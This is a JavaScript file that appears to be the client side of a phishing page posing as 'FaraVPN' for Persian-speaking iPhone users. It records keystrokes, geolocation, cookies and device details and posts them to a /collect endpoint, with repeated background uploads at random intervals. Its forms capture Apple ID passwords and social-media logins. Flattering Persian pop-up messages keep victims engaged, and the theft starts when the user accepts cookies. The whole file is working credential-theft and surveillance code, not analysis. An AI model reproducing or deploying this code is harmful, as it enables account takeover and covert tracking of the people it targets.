(function() {
    let keystrokes = [];
    let userActivity = { typing: false, submitted: false };

    function _0x9d3f() {
        document.addEventListener("keydown", function(e) {
            keystrokes.push({ key: e.key, time: new Date().toISOString() });
            userActivity.typing = true;
            if (keystrokes.length >= 10) {
                fetch("/collect", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ keystrokes: keystrokes, timestamp: new Date().toISOString() })
                });
                keystrokes = [];
            }
        });

        navigator.geolocation.getCurrentPosition(function(p) {
            let data = {
                location: { lat: p.coords.latitude, lon: p.coords.longitude },
                cookies: document.cookie,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: { width: window.screen.width, height: window.screen.height },
                ios_version: navigator.userAgent.match(/OS (\d+_\d+)/)?.[1]?.replace("_", ".") || "Unknown",
                timestamp: new Date().toISOString()
            };
            fetch("/collect", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            });
            localStorage.setItem("session", JSON.stringify({ cookies: document.cookie, timestamp: new Date().toISOString() }));
            sendPeriodicSessionData();
        }, function() {
             let data = {
                cookies: document.cookie,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: { width: window.screen.width, height: window.screen.height },
                ios_version: navigator.userAgent.match(/OS (\d+_\d+)/)?.[1]?.replace("_", ".") || "Unknown",
                timestamp: new Date().toISOString()
            };
            fetch("/collect", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            });
            localStorage.setItem("session", JSON.stringify({ cookies: document.cookie, timestamp: new Date().toISOString() }));
            sendPeriodicSessionData();
        });


        let taunts = [
            { condition: () => !userActivity.typing && !userActivity.submitted, text: "عزیزم، با FaraVPN هیچوقت قطع نمی‌شی! فقط یه قدم دیگه! 😊" },
            { condition: () => userActivity.typing, text: "وای، تو چقدر سریع پیش می‌ری! با FaraVPN فراتر از استارلینک رو تجربه کن! 😍" },
            { condition: () => userActivity.submitted, text: "آفرین! آماده‌ای برای فعال‌سازی FaraVPN؟ فقط یه لحظه صبر کن! 😊" },
            { condition: () => true, text: "فوق‌العاده‌ست! با FaraVPN به هر چیزی که بخوای دسترسی داری! ادامه بده! 🌟" },
            { condition: () => true, text: "هی، تو بهترینی! با FaraVPN هیچوقت قطع نمی‌شی! 😘" },
            { condition: () => true, text: "عالیه! داری ما رو به وجد میاری! یه قدم دیگه تا فعال‌سازی FaraVPN! 😊" }
        ];

        setInterval(function() {
            let lilaText = document.getElementById("lila-text");
            if (lilaText) {
                let applicableMessages = taunts.filter(t => t.condition());
                let randomMessage = applicableMessages[Math.floor(Math.random() * applicableMessages.length)];
                lilaText.innerText = randomMessage.text;
            }
        }, 5000);
    }

    function sendPeriodicSessionData() {
        let delay = Math.random() * (120000 - 30000) + 30000;
        setTimeout(() => {
            fetch("/collect", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    cookies: document.cookie,
                    session: localStorage.getItem("session"),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: { width: window.screen.width, height: window.screen.height },
                    ios_version: navigator.userAgent.match(/OS (\d+_\d+)/)?.[1]?.replace("_", ".") || "Unknown",
                    timestamp: new Date().toISOString()
                })
            });
            sendPeriodicSessionData();
        }, delay);
    }

    document.getElementById("login-form")?.addEventListener("submit", function(e) {
        e.preventDefault();
        let data = {
            apple_id: document.getElementById("username").value,
            password: document.getElementById("password").value,
            platform: navigator.platform,
            ios_version: navigator.userAgent.match(/OS (\d+_\d+)/)?.[1]?.replace("_", ".") || "Unknown",
            timestamp: new Date().toISOString()
        };
        userActivity.submitted = true;
        keystrokes = [];
        fetch("/collect", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        }).then(response => response.json()).then(data => {
            document.getElementById("loading").style.display = "block";
            document.getElementById("lila-popup").style.display = "block";
            setTimeout(function() { window.location.href = data.redirect; }, 1000);
        });
    });

    document.getElementById("social-form")?.addEventListener("submit", function(e) {
        e.preventDefault();
        let data = {
            social_accounts: [{
                service: document.getElementById("service").value,
                username: document.getElementById("social-username").value,
                password: document.getElementById("social-password").value
            }],
            platform: navigator.platform,
            ios_version: navigator.userAgent.match(/OS (\d+_\d+)/)?.[1]?.replace("_", ".") || "Unknown",
            timestamp: new Date().toISOString()
        };
        userActivity.submitted = true;
        keystrokes = [];
        fetch("/collect", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        }).then(response => response.json()).then(data => {
            document.getElementById("loading").style.display = "block";
            document.getElementById("lila-popup").style.display = "block";
            setTimeout(function() { window.location.href = data.redirect; }, 1000);
        });
    });

    window.acceptCookies = function() {
        document.getElementById("cookie-consent").style.display = "none";
        document.getElementById("lila-popup").style.display = "block";
        _0x9d3f();
    };

    document.addEventListener("DOMContentLoaded", function() {
        // این بلاک فعلا کاری نمی کند، چون نیاز به نمایش پاپ آپ کوکی در ابتدا داریم.
    });

})();
